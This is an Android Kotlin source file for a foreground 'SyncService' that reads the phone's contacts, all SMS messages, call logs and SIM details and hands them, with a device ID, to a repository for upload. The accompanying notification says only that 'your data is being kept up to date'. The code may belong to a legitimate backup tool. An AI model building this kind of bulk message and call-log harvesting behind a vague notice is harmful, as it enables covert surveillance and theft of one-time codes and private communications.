package com.boxx.datasync.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.core.content.PermissionChecker
import androidx.preference.PreferenceManager
import com.boxx.datasync.MainActivity
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.crashlytics.FirebaseCrashlytics
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import javax.inject.Inject

@AndroidEntryPoint
class SyncService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    @Inject
    lateinit var repository: DataRepository

    private val crashlytics = FirebaseCrashlytics.getInstance()
    private lateinit var deviceId: String

    private var syncJob: Job? = null

    private var remoteSyncJob: Job? = null
    private var heartbeatJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) {
            stopSelf()
            return
        }
        createNotificationChannel()

        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+
            startForeground(
                1,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(1, notification)
        }

    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serviceScope.launch {
            performSync(isFullSync = true)
        }
        return START_NOT_STICKY
    }

    private suspend fun performSync(isFullSync: Boolean = false) {
        Log.d("SyncService", "FOREGROUND_SYNC_STARTED")

        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        val currentTime = System.currentTimeMillis()

        // Check permissions before fetching
        if (!hasPermission(android.Manifest.permission.READ_CONTACTS) &&
            !hasPermission(android.Manifest.permission.READ_SMS) &&
            !hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
            Log.d("SyncService", "PERMISSIONS_STATUS: Not granted")
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }

        try {
            val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
            val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
            val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)

            val contacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                DataHelper.fetchContacts(this@SyncService, sinceTimestamp = lastContactSync)
            } else emptyList()
            Log.d("SyncService", "CONTACTS_READ_COUNT: ${contacts.size}")

            val smsList = if (hasPermission(android.Manifest.permission.READ_SMS)) {
                DataHelper.fetchSMS(this@SyncService, sinceTimestamp = lastSmsSync)
            } else emptyList()
            Log.d("SyncService", "SMS_READ_COUNT: ${smsList.size}")

            val callLogs = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
                DataHelper.fetchCallLogs(this@SyncService, sinceTimestamp = lastCallSync)
            } else emptyList()
            Log.d("SyncService", "CALLLOG_READ_COUNT: ${callLogs.size}")

            val totalContacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this@SyncService).size else 0
            val totalSms = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this@SyncService).size else 0
            val totalCalls = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this@SyncService).size else 0

            val simState = DataHelper.getSimState(this@SyncService).toMutableMap()
            simState["contactCount"] = totalContacts
            simState["smsCount"] = totalSms
            simState["callCount"] = totalCalls

            Log.d("SyncService", "SIM_STATE_LOADED")
            if (simState["sim1Ready"] as Boolean) Log.d("SyncService", "SIM1_AVAILABLE")
            if (simState["sim2Ready"] as Boolean) Log.d("SyncService", "SIM2_AVAILABLE")
            if (!(simState["sim1Ready"] as Boolean) && !(simState["sim2Ready"] as Boolean)) Log.d("SyncService", "NO_SIM_AVAILABLE")
            Log.d("SyncService", "SIM_STATE_UPLOADED")

            val lastHandledSyncRequest = prefs.getLong("last_handled_sync_request", 0L)

            repository.performSync(
                deviceId = deviceId,
                contacts = contacts,
                smsList = smsList,
                callLogs = callLogs,
                simState = simState,
                isFullSync = isFullSync,
                lastHandledSyncRequest = lastHandledSyncRequest
            )

            prefs.edit().apply {
                if (smsList.isNotEmpty()) putLong("last_sms_sync", smsList.maxOf { it.date })
                if (callLogs.isNotEmpty()) putLong("last_call_sync", callLogs.maxOf { it.date })
                if (contacts.isNotEmpty()) putLong("last_contact_sync", currentTime)
            }.apply()

            Log.d("SyncService", "FOREGROUND_SYNC_SUCCESS")
        } catch (e: Exception) {
            Log.e("SyncService", "FOREGROUND_SYNC_FAILED", e)
            crashlytics.recordException(e)
        } finally {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sync_channel",
                "Data Sync Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, "sync_channel")
            .setContentTitle("Data Syncing")
            .setContentText("Your data is being kept up to date.")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
